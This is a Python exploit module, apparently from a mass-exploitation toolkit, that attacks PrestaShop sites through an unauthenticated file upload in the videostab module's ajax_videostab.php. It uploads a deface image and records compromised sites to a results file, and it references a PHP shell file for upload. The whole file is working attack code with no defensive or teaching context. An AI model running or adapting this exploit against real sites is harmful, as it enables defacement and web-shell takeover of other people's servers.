# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
Jce_Deface_image = 'files/pwn.gif'
ShellPresta = 'files/up.php'


def Exploit(site):
    try:
        Exp = site + '/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload'
        Checkvuln = requests.get('http://' + Exp, timeout=5, headers=Headers)
        FileDataIndex = {'qqfile': open(Jce_Deface_image, 'rb')}
        if Checkvuln.status_code == 200:
            requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=Headers)
            IndexPath = site + '/modules/videostab/uploads/' + Jce_Deface_image.split('/')[1]
            CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=Headers)
            if 'GIF89a' in CheckIndex.content:
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(IndexPath + '\n')
                return printModule.returnYes(site, 'N/A', 'videostab Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', 'videostab Module', 'Prestashop')
        else:
            return printModule.returnNo(site, 'N/A', 'videostab Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', 'videostab Module', 'Prestashop')
